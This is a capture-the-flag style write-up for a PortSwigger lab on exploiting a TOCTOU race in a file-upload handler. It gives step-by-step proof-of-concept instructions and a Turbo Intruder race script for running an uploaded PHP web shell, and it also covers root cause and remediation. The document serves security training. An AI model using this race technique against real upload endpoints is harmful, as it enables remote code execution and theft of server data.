# Lab 07 — Web Shell Upload via Race Condition

[![Category](https://img.shields.io/badge/Category-File%20Upload-indigo)]()
[![Type](https://img.shields.io/badge/Type-File%20Upload%20-%20TOCTOU%20Race%20Condition-orange)]()
[![Difficulty](https://img.shields.io/badge/Difficulty-Expert-9cf)]()
[![Severity](https://img.shields.io/badge/Severity-Critical-critical)]()
[![Source](https://img.shields.io/badge/Source-PortSwigger%20Web%20Security%20Academy-blue)](https://portswigger.net/web-security/file-upload)

> Part of the [File Upload Labs](./README.md) series — PortSwigger Web Security Academy.

---

## 1. Overview

| Field | Detail |
|---|---|
| **Lab Name** | Web Shell Upload via Race Condition |
| **Difficulty** | Expert |
| **Vulnerability Class** | File Upload — TOCTOU Race Condition |
| **Weakness (CWE)** | CWE-367: Time-of-Check Time-of-Use (TOCTOU) Race Condition |
| **Severity** | Critical |
| **Objective** | Upload a basic PHP web shell and use it to exfiltrate the contents of /home/carlos/secret. |

## 2. Summary

The server's upload handler calls `move_uploaded_file()` to place the file in the public `avatars/` directory *before* running virus/type validation (`checkViruses()` and `checkFileType()`). Only if validation fails is the file deleted via `unlink()`. This creates a window during which a malicious file is live on the server and requestable — exploited by firing many `GET` requests for the file at (or immediately after) upload time.

## 3. Proof of Concept (PoC)

**Step 1 — Confirm validation appears robust:**  
Attempt to upload `exploit.php` directly — rejected ("only JPG & PNG files are allowed").

**Step 2 — Install Turbo Intruder:**  
From the BApp Store if not already installed.

**Step 3 — Send the upload request to Turbo Intruder:**  
Right-click `POST /my-account/avatar` (carrying `exploit.php`) → **Extensions > Turbo Intruder > Send to Turbo Intruder**.

**Step 4 — Use the race-condition script template:**  
```python
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint, concurrentConnections=10)
    request1 = '''<YOUR-POST-REQUEST>'''
    request2 = '''<YOUR-GET-REQUEST>'''
    engine.queue(request1, gate='race1')
    for x in range(5):
        engine.queue(request2, gate='race1')
    engine.openGate('race1')
    engine.complete(timeout=60)

def handleResponse(req, interesting):
    table.add(req)
```

Replace `<YOUR-POST-REQUEST>` with the full upload request, and `<YOUR-GET-REQUEST>` with a `GET /files/avatars/exploit.php` request (copied from a previous avatar-image fetch, filename adjusted).

**Step 5 — Attack and inspect results:**  
Click **Attack**. Among the resulting GET responses, some return `404` (too early/too late), but at least one returns `200 OK` with Carlos's secret — caught in the window between the file being written and being deleted.


## 4. Evidence (Request / Response)

```http
POST /my-account/avatar HTTP/2
[... exploit.php payload ...]

--- fired via Turbo Intruder, gated together with N copies of: ---

GET /files/avatars/exploit.php HTTP/2

HTTP/2 200 OK          <- the winning request, inside the race window
...secret contents...
```

## 5. Root Cause Analysis

The vulnerable server-side logic violates the principle that a resource must not be made accessible before it has been fully validated (classic TOCTOU). The file is written and web-accessible *before* the virus/type check runs, and only removed afterward if it fails — meaning there's always a window, however brief, where an unvalidated file can be executed. (Note: this lab's window is deliberately generous and can also be won manually in Burp Repeater by sending the upload then rapidly re-sending the GET request, or by grouping both requests and using **Send group in parallel / single-packet attack**; Turbo Intruder is the more broadly applicable technique for tighter real-world windows.)

### Attacker vs. Defender Perspective

- **Attacker view:** When validation seems robust, check whether the file is written to a public location before or after validation completes — if before, fire many concurrent requests to catch the window.
- **Defender view:** Validate files in a private/temporary location first, and only expose them publicly after every check has passed.

## 6. Impact

Complete bypass of otherwise seemingly robust upload validation, leading to full remote code execution.

## 7. Remediation

- Perform all validation *before* the file is ever written to a web-accessible location — validate in a quarantined/temporary directory first, and only move the file to its public location after it passes every check.
- Never make a file accessible via a predictable URL before validation completes.
- Perform the move and the validation as a single atomic operation where possible.
- Apply defense in depth: non-executable storage (see Labs 01–06 remediation) prevents an uploaded file from running as code even if a race condition is won.

## 8. References

- [PortSwigger — File Upload Vulnerabilities](https://portswigger.net/web-security/file-upload)
- [OWASP — Unrestricted File Upload](https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload)
- [CWE-367: Time-of-Check Time-of-Use (TOCTOU) Race Condition](https://cwe.mitre.org/data/definitions/367.html)

---

*Writeup produced for educational and authorized lab purposes only (PortSwigger Web Security Academy environment).*
